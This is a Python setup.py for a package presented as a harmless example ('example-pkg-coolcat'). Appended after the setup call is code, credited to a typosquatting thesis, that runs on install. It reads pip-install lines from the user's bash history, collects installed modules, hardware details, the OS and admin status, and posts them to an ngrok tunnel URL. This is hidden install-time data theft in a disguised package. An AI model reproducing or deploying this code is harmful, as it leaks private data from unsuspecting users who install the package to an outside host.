import os
import ctypes
import sys
import platform
import subprocess

debug = False

import setuptools

with open("README.md", "r", encoding="utf-8") as fh:
    long_description = fh.read()

setuptools.setup(
    name="example-pkg-coolcat", # Replace with your own username
    version="0.0.2",
    author="Example Author",
    author_email="author@example.com",
    description="A small example package",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/superdeen/sampleproject",
    download_url = 'https://github.com/superdeen/sampleproject/archive/0.0.2.tar.gz',
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    packages=setuptools.find_packages(),
    python_requires=">=3.0",
)

"""
Notification program used in the typo squatting
bachelor thesis for the python package index.

Created in autumn 2015.

Copyright by Nikolai Tschacher
"""
# we are using Python3
if sys.version_info >= (3, 0):
  import urllib.request
  from urllib.parse import urlencode

  GET = urllib.request.urlopen

  def python3POST(url, data={}, headers=None):
    """
    Returns the response of the POST request as string or
    False if the resource could not be accessed.
    """
    data = urllib.parse.urlencode(data).encode()
    request = urllib.request.Request(url, data)
    try:
      reponse = urllib.request.urlopen(request, timeout=15)
      cs = reponse.headers.get_content_charset()
      if cs:
        return reponse.read().decode(cs)
      else:
        return reponse.read().decode('utf-8')
    except urllib.error.HTTPError as he:
      # try again if some 400 or 500 error was received
      return ''
    except Exception as e:
      # everything else fails
      return False
  POST = python3POST
# we are using Python2
else:
  import urllib2
  from urllib import urlencode
  GET = urllib2.urlopen
  def python2POST(url, data={}, headers=None):
    """
    See python3POST
    """
    req = urllib2.Request(url, urlencode(data))
    try:
      response = urllib2.urlopen(req, timeout=15)
      return response.read()
    except urllib2.HTTPError as he:
      return ''
    except Exception as e:
      return False
  POST = python2POST


try:
  from subprocess import DEVNULL # py3k
except ImportError:
  DEVNULL = open(os.devnull, 'wb')


def get_command_history():
  if os.name == 'nt':
    # handle windows
    # http://serverfault.com/questions/95404/
    #is-there-a-global-persistent-cmd-history
    # apparently, there is no history in windows :(
    return ''

  elif os.name == 'posix':
    # handle linux and mac
    cmd = 'cat {}/.bash_history | grep -E "pip3[23]? install"'
    return os.popen(cmd.format(os.path.expanduser('~'))).read()


def get_hardware_info():
  if os.name == 'nt':
    # handle windows
    return platform.processor()

  elif os.name == 'posix':
    # handle linux and mac
    if sys.platform.startswith('linux'):
      try:
        hw_info = subprocess.check_output('lshw -short',
                   stderr=DEVNULL, shell=True)
      except:
        hw_info = ''

      if not hw_info:
        try:
          hw_info = subprocess.check_output('lspci',
                   stderr=DEVNULL, shell=True)
        except:
          hw_info = ''
        hw_info += '\n' +\
          os.popen('free -m').read().strip()

      return hw_info

    elif sys.platform == 'darwin':
      # According to https://developer.apple.com/library/
      # mac/documentation/Darwin/Reference/ManPages/
      # man8/system_profiler.8.html
      # no personal information is provided by detailLevel: mini
      return os.popen('system_profiler -detailLevel mini').read()


def get_all_installed_modules():
  # first try the default path
  pip3_list = os.popen('pip3 list').read().strip()

  if pip3_list:
    return pip3_list
  else:
    if os.name == 'nt':
      paths = ('C:/Python27',
           'C:/Python34',
           'C:/Python26',
           'C:/Python33',
           'C:/Python35',
           'C:/Python',
           'C:/Python2',
           'C:/Python3')
      # try some paths that make sense to me
      for loc in paths:
        pip3_location = os.path.join(loc, 'Scripts/pip3.exe')
        if os.path.exists(pip3_location):
          cmd = '{} list'.format(pip3_location)
          try:
            pip3_list = subprocess.check_output(cmd,
                   stderr=DEVNULL, shell=True)
          except:
            pip3_list = ''
          if pip3_list:
            return pip3_list
  return ''


def notify_home(url, package_name, intended_package_name):
  host_os = platform.platform()
  try:
    admin_rights = bool(os.getuid() == 0)
  except AttributeError:
    try:
      ret = ctypes.windll.shell32.IsUserAnAdmin()
      admin_rights = bool(ret != 0)
    except:
      admin_rights = False

  if os.name != 'nt':
    try:
      pip3_version = os.popen('pip3 --version').read()
    except:
      pip3_version = ''
  else:
    pip3_version = platform.python_version()

  url_data = {
    'p1': package_name,
    'p2': intended_package_name,
    'p3': 'pip3',
    'p4': host_os,
    'p5': admin_rights,
    'p6': pip3_version,
  }

  post_data = {
    'p7': get_command_history(),
    'p8': get_all_installed_modules(),
    'p9': get_hardware_info(),
  }

  url_data = urlencode(url_data)
  response = POST(url + url_data, post_data)

  if debug:
    print(response)

  print('')
  print("Warning!!! Maybe you made a typo in your installation\
   command or the module does only exist in the python stdlib?!")
  print("Did you want to install '{}'\
   instead of '{}'??!".format(intended_package_name, package_name))
  print('For more information, please\
   visit http://svs-repo.informatik.uni-hamburg.de/')


def main():
  if debug:
    notify_home('http://localhost:1234/?',
             'pmba_basic', 'pmba_basic')
  else:
    notify_home('https://e9f41075c2bf.ngrok.io/?',
                     'pmba_basic', 'pmba_basic')

if __name__ == '__main__':
  main()

